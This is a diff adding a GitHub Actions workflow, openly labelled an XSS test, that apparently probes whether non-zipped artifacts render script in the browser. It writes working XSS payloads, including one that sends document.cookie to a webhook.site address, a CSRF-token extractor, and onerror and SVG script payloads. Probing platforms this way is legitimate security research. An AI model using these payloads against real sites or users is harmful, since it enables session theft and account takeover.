@@ -1,0 +1,57 @@
+name: Non-Zipped Artifact XSS Test
+on: [push]
+jobs:
+  upload-html:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create HTML files with XSS payloads
+        run: |
+          mkdir -p artifact-output
+
+          # Basic XSS
+          echo '<html><body><h1>Test</h1><script>document.title="XSS:"+document.domain</script></body></html>' > artifact-output/xss-test.html
+
+          # Cookie theft attempt
+          echo '<html><body><script>fetch("https://webhook.site/test?c="+document.cookie)</script></body></html>' > artifact-output/cookie-steal.html
+
+          # Document domain check
+          echo '<html><body><script>document.write("Domain: "+document.domain+" Origin: "+window.origin)</script></body></html>' > artifact-output/domain-check.html
+
+          # CSRF token extraction
+          echo '<html><body><script>fetch("/").then(r=>r.text()).then(t=>{var m=t.match(/csrf-token.*?content="([^"]+)"/);document.write("CSRF: "+(m?m[1]:"none"))})</script></body></html>' > artifact-output/csrf-extract.html
+
+          # Simple img onerror payload
+          echo '<html><body><img src=x onerror="document.write(document.domain)"><h1>Artifact Test</h1></body></html>' > artifact-output/img-xss.html
+
+          # SVG with script
+          echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' > artifact-output/xss.svg
+
+      - name: Upload single HTML artifact (non-zipped via v7)
+        uses: actions/upload-artifact@v7
+        with:
+          path: artifact-output/xss-test.html
+          archive: false
+
+      - name: Upload domain-check HTML (non-zipped via v7)
+        uses: actions/upload-artifact@v7
+        with:
+          path: artifact-output/domain-check.html
+          archive: false
+
+      - name: Upload SVG (non-zipped via v7)
+        uses: actions/upload-artifact@v7
+        with:
+          path: artifact-output/xss.svg
+          archive: false
+
+      - name: Upload img-xss HTML (non-zipped via v7)
+        uses: actions/upload-artifact@v7
+        with:
+          path: artifact-output/img-xss.html
+          archive: false
+
+      - name: Upload all artifacts zipped (v4 fallback)
+        uses: actions/upload-artifact@v4
+        with:
+          name: xss-test-artifacts-zipped
+          path: artifact-output/
